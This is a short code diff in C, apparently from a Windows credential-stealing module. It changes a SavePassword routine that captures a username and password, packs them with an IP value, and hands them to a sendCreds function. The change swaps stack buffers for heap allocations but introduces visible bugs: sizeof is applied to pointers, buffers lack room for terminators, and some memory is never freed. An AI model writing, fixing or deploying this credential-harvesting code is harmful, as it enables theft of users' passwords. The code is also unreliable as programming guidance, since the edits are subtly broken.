@@ -25,9 +25,9 @@ void sendCreds(char* creds)
 
 void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 {
-	char user[50];
-	char pass[50];
-	char creds[150];
+	char* user = (char*)malloc(username->Length / 2);
+	char* pass = (char*)malloc(password->Length / 2);
+	char* creds = (char*)malloc((username->Length / 2) + (password->Length / 2) + 50);
 
 	wcstombs(user, username->Buffer, sizeof(user));
 	wcstombs(pass, password->Buffer, sizeof(pass));
@@ -36,5 +36,7 @@ void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	snprintf(creds, sizeof(creds), "%s\x11%s\x12%s\x13", user, pass, eip);
 	free(eip);
 
-	sendCreds(&creds);
+	sendCreds(creds);
+
+	free(creds);
 }
